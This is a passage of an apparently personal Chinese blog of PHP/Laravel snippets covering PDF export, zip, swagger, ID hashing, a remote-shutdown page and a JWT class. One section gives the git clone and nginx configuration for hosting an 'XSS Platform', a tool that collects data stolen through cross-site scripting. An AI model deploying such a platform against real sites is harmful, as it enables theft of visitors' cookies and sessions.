class="number">-12</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">33</span>] Bilibili.DEBUG: GET: https:<span class="comment">//api.live.bilibili.com/lottery/v1/SilverBox/getCurrentTask</span></span><br><span class="line">[<span class="number">2018</span><span class="number">-12</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">33</span>] Bilibili.DEBUG: &#123;<span class="string">"code"</span>:<span class="number">0</span>,<span class="string">"msg"</span>:<span class="string">""</span>,<span class="string">"message"</span>:<span class="string">""</span>,<span class="string">"data"</span>:&#123;<span class="string">"minute"</span>:<span class="number">3</span>,<span class="string">"silver"</span>:<span class="number">30</span>,<span class="string">"time_start"</span>:<span class="number">1544594312</span>,<span class="string">"time_end"</span>:<span class="number">1544594492</span>,<span class="string">"times"</span>:<span class="number">1</span>,<span class="string">"max_times"</span>:<span class="number">3</span>&#125;&#125;</span><br><span class="line">[<span class="number">2018</span><span class="number">-12</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">33</span>] Bilibili.NOTICE: 领取宝箱成功，内含 <span class="number">30</span> 个瓜子</span><br><span class="line">[<span class="number">2018</span><span class="number">-12</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">33</span>] Bilibili.INFO: 等待 <span class="number">3</span> 分钟后打开宝箱</span><br><span class="line">[<span class="number">2018</span><span class="number">-12</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">33</span>] Bilibili.INFO: 检查每日任务</span><br><span class="line"># vi /usr/lib/systemd/system/bilibili.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Bilibili Helper Manager</span><br><span class="line">Documentation=https:<span class="comment">//github.com/metowolf/BilibiliHelper</span></span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=<span class="regexp">/usr/</span>bin/php /root/BilibiliHelper/index.php</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">$ systemctl restart bilibili</span><br><span class="line">[root@VM_0_14_centos BilibiliHelper]# ps aux|grep bili|grep -v grep</span><br><span class="line">root      <span class="number">7987</span>  <span class="number">1.6</span>  <span class="number">1.0</span> <span class="number">317640</span> <span class="number">19012</span> ?        Ss   <span class="number">14</span>:<span class="number">03</span>   <span class="number">0</span>:<span class="number">00</span> /usr/bin/php /root/BilibiliHelper/index.php</span><br></pre></td></tr></table></figure>
<h3 id="XSS-Platform"><a href="#XSS-Platform" class="headerlink" title="XSS Platform"></a>XSS Platform</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://laravel-china.org/articles/20815</span></span><br><span class="line">#git clone https://github.com/78778443/xssplatform.git</span><br><span class="line">#vi /etc/nginx/nginx.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen       <span class="number">80</span>;</span><br><span class="line">    server_name  xss.localhost;</span><br><span class="line">    root  /Users/song/mycode/safe/xssplatform/;</span><br><span class="line"></span><br><span class="line">    rewrite <span class="string">"^/([0-9a-zA-Z]&#123;6&#125;)$"</span> /index.php?<span class="keyword">do</span>=code&amp;urlKey=$<span class="number">1</span> last;</span><br><span class="line">    rewrite <span class="string">"^/do/auth/(\w+?)(/domain/([\w\.]+?))?$"</span> /index.php?<span class="keyword">do</span>=<span class="keyword">do</span>&amp;auth=$<span class="number">1</span>&amp;domain=$<span class="number">3</span> last;</span><br><span class="line">    rewrite <span class="string">"^/register/(.*?)$"</span> /index.php?<span class="keyword">do</span>=register&amp;key=$<span class="number">1</span> last;</span><br><span class="line">    rewrite <span class="string">"^/register-validate/(.*?)$"</span> /index.php?<span class="keyword">do</span>=register&amp;act=validate&amp;key=$<span class="number">1</span> last;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line"></span><br><span class="line">        index index.html index.htm index.php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span>;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">#nginx -s reload</span><br></pre></td></tr></table></figure>
<h3 id="生成小程序图文海报"><a href="#生成小程序图文海报" class="headerlink" title="生成小程序图文海报"></a>生成小程序图文海报</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//laravel-china.org/articles/18418</span></span><br><span class="line">composer <span class="built_in">require</span> ibrand/laravel-miniprogram-poster </span><br><span class="line">低于 Laravel5<span class="number">.5</span> 版本，config/app.php 文件中 <span class="string">'providers'</span> 添加iBrand\Poster\PhantoMmagickServiceProvider::<span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">图片保存在 storage/app/public 下所以需要执行 php artisan storage:link</span><br><span class="line"></span><br><span class="line">如需自定义配置请执行 php artisan vendor:publish --provider=<span class="string">"iBrand\Poster\PhantoMmagickServiceProvider"</span> --tag=<span class="string">"config"</span></span><br><span class="line"></span><br><span class="line">use iBrand\Miniprogram\Poster\MiniProgramShareImg;</span><br><span class="line"></span><br><span class="line">$url = <span class="string">'https://www.ibrand.cc/'</span>;</span><br><span class="line">$result = MiniProgramShareImg::generateShareImage($url);</span><br></pre></td></tr></table></figure>
<h3 id="HTML-导出-PDF"><a href="#HTML-导出-PDF" class="headerlink" title="HTML 导出 PDF"></a>HTML 导出 PDF</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://laravel-china.org/articles/21905 https://github.com/niklasravnsborg/laravel-pdf</span></span><br><span class="line">下载 https:<span class="comment">//wkhtmltopdf.org/downloads.html</span></span><br><span class="line">wkhtmltopdf https:<span class="comment">//www.baidu.com 1.pdf</span></span><br><span class="line">$ wkhtmltopdf.exe --lowquality <span class="string">"http://www.baidu.com"</span> baidu.pdf</span><br><span class="line">Loading pages (<span class="number">1</span>/<span class="number">6</span>)</span><br><span class="line">libpng warning: iCCP: known incorrect sRGB profile           ] <span class="number">35</span>%</span><br><span class="line">libpng warning: iCCP: known incorrect sRGB profile           ] <span class="number">41</span>%</span><br><span class="line">libpng warning: iCCP: known incorrect sRGB profile           ] <span class="number">46</span>%</span><br><span class="line">Counting pages (<span class="number">2</span>/<span class="number">6</span>)</span><br><span class="line">Resolving links (<span class="number">4</span>/<span class="number">6</span>)</span><br><span class="line">Loading headers and footers (<span class="number">5</span>/<span class="number">6</span>)</span><br><span class="line">Printing pages (<span class="number">6</span>/<span class="number">6</span>)</span><br><span class="line">Done</span><br><span class="line"></span><br><span class="line">composer <span class="built_in">require</span> barryvdh/laravel-snappy</span><br><span class="line"></span><br><span class="line">将ServiceProvider添加到config / app.php中的providers数组</span><br><span class="line">Barryvdh\Snappy\ServiceProvider::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">添加<span class="title">facade</span>到<span class="title">config</span> / <span class="title">app</span>.<span class="title">php</span>中的<span class="title">aliases</span>数组中</span></span><br><span class="line"><span class="class">'<span class="title">PDF</span>' </span>=&gt; Barryvdh\Snappy\Facades\SnappyPdf::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">'<span class="title">SnappyImage</span>' </span>=&gt; Barryvdh\Snappy\Facades\SnappyImage::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">生成配置文件</span></span><br><span class="line">php artisan vendor:publish --provider="Barryvdh\Snappy\ServiceProvider"</span><br><span class="line">vi config/snappy.php</span><br><span class="line">binary=&gt;<span class="string">'D:\laragon\www\source\wkhtmltopdf\bin\wkhtmltopdf.exe'</span></span><br><span class="line"># 下载</span><br><span class="line">$pdf = \PDF::loadView(<span class="string">'welcome'</span>, $data);</span><br><span class="line"><span class="keyword">return</span> $pdf-&gt;download(<span class="string">'welcome.pdf'</span>);</span><br><span class="line"></span><br><span class="line"># 渲染页面</span><br><span class="line">$html = <span class="string">'&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;h1&gt;订单id&lt;/h1&gt;&lt;h2&gt;12346546&lt;/h2&gt;&lt;/html&gt;'</span>;</span><br><span class="line">$pdf = \PDF::loadHTML($html);</span><br><span class="line"><span class="keyword">return</span> $pdf-&gt;inline();</span><br><span class="line"></span><br><span class="line">$pdf = \App::make(<span class="string">'snappy.pdf.wrapper'</span>);</span><br><span class="line">$pdf-&gt;loadHTML(<span class="string">'&lt;h1&gt;Test&lt;/h1&gt;'</span>);</span><br><span class="line"><span class="keyword">return</span> $pdf-&gt;inline();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> PDF::loadFile(<span class="string">'http://www.github.com'</span>)-&gt;inline(<span class="string">'github.pdf'</span>);</span><br><span class="line">$snappy = \App::make(<span class="string">'snappy.pdf'</span>);</span><br><span class="line"><span class="comment">//To file</span></span><br><span class="line">$html = <span class="string">'&lt;h1&gt;Bill&lt;/h1&gt;&lt;p&gt;You owe me money, dude.&lt;/p&gt;'</span>;</span><br><span class="line">$snappy-&gt;generateFromHtml($html, <span class="string">'/tmp/bill-123.pdf'</span>);</span><br><span class="line">$snappy-&gt;generate(<span class="string">'http://www.github.com'</span>, <span class="string">'/tmp/github.pdf'</span>);</span><br><span class="line"></span><br><span class="line">#门面（facade）加载HTML字符串、文件或者视图</span><br><span class="line">#stream()方法显示在浏览器中</span><br><span class="line">#save()方法保存到文件</span><br><span class="line">#download()方法下载</span><br><span class="line"></span><br><span class="line">$pdf = PDF::loadView(<span class="string">'pdf.invoice'</span>, $data);</span><br><span class="line"><span class="keyword">return</span> $pdf-&gt;download(<span class="string">'invoice.pdf'</span>);</span><br><span class="line"></span><br><span class="line">#链式操作</span><br><span class="line"><span class="keyword">return</span> PDF::loadFile(<span class="string">'file.html'</span>)-&gt;save(<span class="string">'file.pdf'</span>)-&gt;stream(<span class="string">'download.pdf'</span>);</span><br><span class="line"></span><br><span class="line">#方向</span><br><span class="line">PDF::loadHTML($html)-&gt;setPaper(<span class="string">'a4'</span>, <span class="string">'landscape'</span>)-&gt;setWarnings(<span class="literal">false</span>)-&gt;save(<span class="string">'file.pdf'</span>)</span><br><span class="line"></span><br><span class="line">#生成图片</span><br><span class="line">$pdf = SnappyImage::loadView(<span class="string">'pdf.invoice'</span>, $data);</span><br><span class="line"><span class="keyword">return</span> $pdf-&gt;download(<span class="string">'invoice.image'</span>);</span><br><span class="line">https:<span class="comment">//php1024.com/posts/45.htm</span></span><br></pre></td></tr></table></figure>
<h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://laravel-china.org/topics/21368</span></span><br><span class="line">composer <span class="built_in">require</span> chumper/zipper</span><br><span class="line">$zipper = <span class="keyword">new</span> \Chumper\Zipper\Zipper;</span><br><span class="line"><span class="comment">// https://github.com/Chumper/Zipper https://github.com/Ne-Lexa/php-zip</span></span><br><span class="line">$zipper-&gt;make(<span class="string">'test.zip'</span>)-&gt;folder(<span class="string">'test'</span>)-&gt;add(<span class="string">'composer.json'</span>);</span><br><span class="line">$zipper-&gt;zip(<span class="string">'test.zip'</span>)-&gt;folder(<span class="string">'test'</span>)-&gt;add(<span class="string">'composer.json'</span>,<span class="string">'test'</span>);</span><br><span class="line"></span><br><span class="line">$zipper-&gt;remove(<span class="string">'composer.lock'</span>);</span><br><span class="line"></span><br><span class="line">$zipper-&gt;folder(<span class="string">'mySuperPackage'</span>)-&gt;add(</span><br><span class="line">    array(</span><br><span class="line">        <span class="string">'vendor'</span>,</span><br><span class="line">        <span class="string">'composer.json'</span></span><br><span class="line">    ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$zipper-&gt;getFileContent(<span class="string">'mySuperPackage/composer.json'</span>);</span><br><span class="line"></span><br><span class="line">$zipper-&gt;make(<span class="string">'test.zip'</span>)-&gt;extractTo(<span class="string">''</span>,array(<span class="string">'mySuperPackage/composer.json'</span>),<span class="attr">Zipper</span>::WHITELIST);</span><br><span class="line"></span><br><span class="line">$zipper-&gt;close();</span><br></pre></td></tr></table></figure>
<h3 id="Walle-瓦力上线部署系统正确安装"><a href="#Walle-瓦力上线部署系统正确安装" class="headerlink" title="Walle-瓦力上线部署系统正确安装"></a>Walle-瓦力上线部署系统正确安装</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.phpsong.com/2166.html</span></span><br><span class="line">mkdir -p /data/www/walle-web &amp;&amp; cd /data/www/walle-web # 新建目录</span><br><span class="line">git clone git@github.com:meolu/walle-web.git . # 代码检出</span><br></pre></td></tr></table></figure>
<h3 id="api文档swagger"><a href="#api文档swagger" class="headerlink" title="api文档swagger"></a>api文档swagger</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://github.com/zircote/swagger-php</span></span><br><span class="line">$ composer global <span class="built_in">require</span> zircote/swagger-php</span><br><span class="line">Changed current directory to C:<span class="regexp">/Users/</span>suping3/AppData/Roaming/Composer</span><br><span class="line">    <span class="number">1</span>/<span class="number">2</span>:        https:<span class="comment">//packagist.laravel-china.org/p/provider-latest$37c8735b09b76040c9a255538c478903f6395d36efb59ce8ad13018c0e87dea7.json</span></span><br><span class="line">    <span class="number">2</span>/<span class="number">2</span>:        https:<span class="comment">//packagist.laravel-china.org/p/provider-2018-10$6a20a9e7d4e44c231d13cc94ff3b58d88abbec0d6ca0a8aa8e2178d4569d0ea4.json</span></span><br><span class="line">    Finished: success: <span class="number">2</span>, <span class="attr">skipped</span>: <span class="number">0</span>, <span class="attr">failure</span>: <span class="number">0</span>, <span class="attr">total</span>: <span class="number">2</span></span><br><span class="line">Using version ^<span class="number">3.0</span> <span class="keyword">for</span> zircote/swagger-php</span><br><span class="line">./composer.json has been updated</span><br><span class="line">Loading composer repositories <span class="keyword">with</span> package information</span><br><span class="line">Updating dependencies (including <span class="built_in">require</span>-dev)</span><br><span class="line">Package operations: <span class="number">1</span> install, <span class="number">0</span> updates, <span class="number">0</span> removals</span><br><span class="line">  - Installing zircote/swagger-php (<span class="number">3.0</span><span class="number">.2</span>): Loading <span class="keyword">from</span> cache</span><br><span class="line">Writing lock file</span><br><span class="line">Generating autoload files</span><br><span class="line"></span><br><span class="line">suping3@BJ-D<span class="number">-212361</span>A MINGW64 /d/php_study/PHPTutorial/WWW/laravel</span><br><span class="line">$ vendor/bin/openapi --help</span><br><span class="line"></span><br><span class="line">Usage: openapi [--option value] [<span class="regexp">/path/</span>to/project ...]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --output (-o)     Path to store the generated documentation.</span><br><span class="line">                    ex: --output openapi.yaml</span><br><span class="line">  --exclude (-e)    Exclude path(s).</span><br><span class="line">                    ex: --exclude vendor,library/Zend</span><br><span class="line">  --bootstrap (-b)  Bootstrap a php file <span class="keyword">for</span> defining constants, etc.</span><br><span class="line">                    ex: --bootstrap config/constants.php</span><br><span class="line">  --processor       Register an additional processor.</span><br><span class="line">  --format          Force yaml or json.</span><br><span class="line">  --debug           Show additional error information.</span><br><span class="line">  --help (-h)       Display <span class="keyword">this</span> help message.</span><br></pre></td></tr></table></figure>
<h3 id="手机上利用PHP完成对电脑的操作"><a href="#手机上利用PHP完成对电脑的操作" class="headerlink" title="手机上利用PHP完成对电脑的操作"></a>手机上利用PHP完成对电脑的操作</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://www.helpergarden.com/2014/03/%e5%9c%a8%e6%89%8b%e6%9c%ba%e4%b8%8a%e5%88%a9%e7%94%a8php%e5%ae%8c%e6%88%90%e5%af%b9%e7%94%b5%e8%84%91%e7%9a%84%e6%93%8d%e4%bd%9c.html</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>/&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    a&#123;font-size: <span class="number">32</span>px;&#125;</span><br><span class="line">&lt;<span class="regexp">/style&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href="?type=cancle"&gt;取消关机&lt;/</span>a&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;a href="?type=close"&gt;关机&lt;/a&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$type=isset($_GET['type'])?$_GET['type']:false;</span><br><span class="line">$cmd='';</span><br><span class="line">switch ($type)&#123;</span><br><span class="line">    case 'cancle':</span><br><span class="line">        $cmd="shutdown -a";</span><br><span class="line">        break;</span><br><span class="line">    case 'close':</span><br><span class="line">        $cmd="shutdown -f -s -t 120";</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        $cmd='';</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($cmd))    </span><br><span class="line">exec($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="隐藏你的-ID"><a href="#隐藏你的-ID" class="headerlink" title="隐藏你的 ID"></a>隐藏你的 ID</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://laravel-china.org/articles/18335</span></span><br><span class="line">composer <span class="built_in">require</span> <span class="number">96</span>qbhy/hyid</span><br><span class="line">php artisan vendor:publish --provider=Qbhy\Hyid\ServiceProvider</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    use Qbhy\Hyid\HyidAble;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// or </span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getUserId</span>(<span class="params">$userId</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hyid($userId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// or</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $data = parent::toArray();</span><br><span class="line"></span><br><span class="line">        $data[<span class="string">'id'</span>] = hyid()-&gt;encode($data[<span class="string">'id'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// decode</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">userinfo</span>(<span class="params">$id</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> User::query()-&gt;findOrFail(hyid()-&gt;decode($id))-&gt;toArray();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 非 laravel or lumen 下，可以自行实例化 Hyid 类</span></span><br><span class="line">$secret = <span class="string">'qbhy'</span>;</span><br><span class="line">$offset = <span class="number">1996</span>;</span><br><span class="line">$randomLength = <span class="number">6</span>;</span><br><span class="line">$hyid = <span class="keyword">new</span> Hyid($secret,$offset,$randomLength);</span><br><span class="line"></span><br><span class="line">$encodedId = $hyid-&gt;encode(<span class="number">1</span>);</span><br><span class="line">$id = $hyid-&gt;decode($encodedId);</span><br></pre></td></tr></table></figure>
<h3 id="书童机器人"><a href="#书童机器人" class="headerlink" title="书童机器人"></a>书童机器人</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//laravel-china.org/articles/6429/lang-jelly-robot-chat-with-you</span></span><br><span class="line">$ git clone https:<span class="comment">//github.com/jormin/robot.git</span></span><br><span class="line">$ composer install</span><br><span class="line">$ cd /path/to/robot</span><br><span class="line">$ cp .env.example .env</span><br><span class="line">$ php artisan key:generate</span><br></pre></td></tr></table></figure>
<h3 id="格式化sql"><a href="#格式化sql" class="headerlink" title="格式化sql"></a>格式化sql</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">require_once(<span class="string">'SqlFormatter.php'</span>);</span><br><span class="line"><span class="comment">//https://github.com/jdorn/sql-formatter/blob/master/lib/SqlFormatter.php</span></span><br><span class="line">$query = <span class="string">"SELECT count(*),`Column1`,`Testing`, `Testing Three` FROM `Table1`</span></span><br><span class="line"><span class="string">    WHERE Column1 = 'testing' AND ( (`Column2` = `Column3` OR Column4 &gt;= NOW()) )</span></span><br><span class="line"><span class="string">    GROUP BY Column1 ORDER BY Column3 DESC LIMIT 5,10"</span>;</span><br><span class="line"></span><br><span class="line">echo SqlFormatter::format($query);</span><br><span class="line">echo SqlFormatter::format($query, <span class="literal">false</span>);</span><br><span class="line">echo SqlFormatter::compress($query);</span><br></pre></td></tr></table></figure>
<h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JwtBase</span> </span>&#123;</span><br><span class="line">    <span class="comment">//头部</span></span><br><span class="line">    private <span class="keyword">static</span> $header=array(</span><br><span class="line">        <span 